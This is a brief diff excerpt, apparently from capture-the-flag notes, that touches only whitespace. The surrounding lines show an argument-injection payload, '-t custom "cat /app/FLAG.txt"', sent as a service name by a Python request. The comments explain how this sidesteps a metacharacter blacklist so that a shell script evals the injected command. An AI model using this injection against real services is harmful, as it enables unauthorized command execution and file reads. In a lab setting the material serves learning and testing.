@@ -15,7 +15,7 @@ tricks:
       # Blacklist: &, |, $, ;, \n, \r, `
       # Shell script: ./check_service.sh -t custom "command"
       # eval $custom_command in shell script
-      
+
       payload = '-t custom "cat /app/FLAG.txt"'
       requests.post(url, json={"service_name": payload})
 
@@ -26,4 +26,3 @@ tricks:
       # Original: ./check_service.sh {user_input}
       # Inject: -t custom "malicious_command"
       # Result: ./check_service.sh -t custom "malicious_command"
-
